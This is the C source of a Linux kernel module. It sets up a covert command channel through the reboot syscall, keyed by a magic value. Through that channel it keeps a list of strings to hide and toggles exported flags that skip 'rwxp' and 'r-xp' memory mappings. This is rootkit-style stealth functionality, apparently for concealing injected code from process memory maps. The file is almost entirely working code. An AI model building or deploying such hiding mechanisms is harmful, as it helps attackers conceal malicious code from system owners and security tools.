#include <linux/module.h>
#include <linux/init.h>
#include <linux/string.h>
#include <linux/version.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/atomic.h>
#include <linux/smp.h>
#include <linux/printk.h>

#define DEF_MAGIC					0x11111111
#define PRINT_ARG					1
#define CMD_ADD_TO_HIDE_MAP_LIST	0x11001
#define CMD_CLEAR_HIDE_MAP_LIST		0x11002
#define CMD_SKIP_RWXP_ENABLE		0x11003
#define CMD_SKIP_RWXP_DISABLE		0x11004
#define CMD_SKIP_RXP_ENABLE			0x11005
#define CMD_SKIP_RXP_DISABLE		0x11006

struct string_entry {
    char *string;
    struct list_head list;
};
LIST_HEAD(maps_string_list);

atomic_t skip_rwxp = ATOMIC_INIT(0);
atomic_t skip_rxp = ATOMIC_INIT(0);
EXPORT_SYMBOL(skip_rwxp); 
EXPORT_SYMBOL(skip_rxp); 

static void __exit reboot_lkm_exit(void) 
{
	pr_info("LKM: unload\n");
}

// SYSCALL_DEFINE4(reboot, int, magic1, int, magic2, unsigned int, cmd,
//		void __user *, arg)
// lkm_handle_sys_reboot(magic1, magic2, cmd, arg);
// PLAN
// magic1 main magic
// magic2 command
// cmd, unusable as ptr on 64-bit :(, maybe can be used as delimiter of some sort
// arg, data input, already user ptr so good


int lkm_handle_sys_reboot(int magic1, int magic2, unsigned int cmd, void __user *arg)
{
	char buf[256] = {0};

	if (magic1 != DEF_MAGIC)
		return 0;

	pr_info("LKM: intercepted call! magic: 0x%d id: 0x%d\n", magic1, magic2);

	if (magic2 == PRINT_ARG) {
		if (copy_from_user(buf, arg, 256))
			return 0;

		buf[255] = '\0';
		pr_info("LKM: print %s\n", buf);
	}

	if (magic2 == CMD_ADD_TO_HIDE_MAP_LIST) {
		memzero_explicit(buf, 256);
		struct string_entry *new_entry, *entry;
		if (copy_from_user(buf, (const char __user *)arg, sizeof(buf) - 1))
			return 0;

		buf[255] = '\0';
		
		new_entry = kmalloc(sizeof(*new_entry), GFP_KERNEL);
		if (!new_entry)
			return 0;

		new_entry->string = kstrdup(buf, GFP_KERNEL);		
		if (!new_entry->string) {
			kfree(new_entry);
			return 0;
		}
		
		list_for_each_entry(entry, &maps_string_list, list) {
			if (!strcmp(entry->string, buf)) {
				pr_info("LKM: %s is already here!\n", buf);
				kfree(new_entry->string);
				kfree(new_entry);
				return 0;
			}
		}
		
		pr_info("LKM: entry %s added!\n", buf);
		list_add(&new_entry->list, &maps_string_list);
		smp_mb();

	}
	
	if (magic2 == CMD_CLEAR_HIDE_MAP_LIST) {
		struct string_entry *entry, *tmp;

		list_for_each_entry_safe(entry, tmp, &maps_string_list, list) {
        		pr_info("LKM: entry %s removed!\n", entry->string);
        		list_del(&entry->list);
        		kfree(entry->string);
        		kfree(entry);
        	}
        	smp_mb();
	}

	if (magic2 == CMD_SKIP_RWXP_ENABLE) {
		atomic_set(&skip_rwxp, 1);
		pr_info("LKM: skip_rwxp: 1\n");

	}

	if (magic2 == CMD_SKIP_RWXP_DISABLE) {
		atomic_set(&skip_rwxp, 0);
		pr_info("LKM: skip_rwxp: 0\n");
	}

	if (magic2 == CMD_SKIP_RXP_ENABLE) {
		atomic_set(&skip_rxp, 1);
		pr_info("LKM: skip_r-xp: 1\n");

	}

	if (magic2 == CMD_SKIP_RXP_DISABLE) {
		atomic_set(&skip_rxp, 0);
		pr_info("LKM: skip_r-xp: 0\n");
	}

	return 0;
}

static int __init reboot_lkm_init(void) 
{
	int magic = DEF_MAGIC;
	pr_info("LKM: init with magic: 0x%d\n", magic);
	return 0;
}

module_init(reboot_lkm_init);
module_exit(reboot_lkm_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("xx");
MODULE_DESCRIPTION("reboot lkm chat");

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 0)
MODULE_IMPORT_NS(VFS_internal_I_am_really_a_filesystem_and_am_NOT_a_driver);
#endif
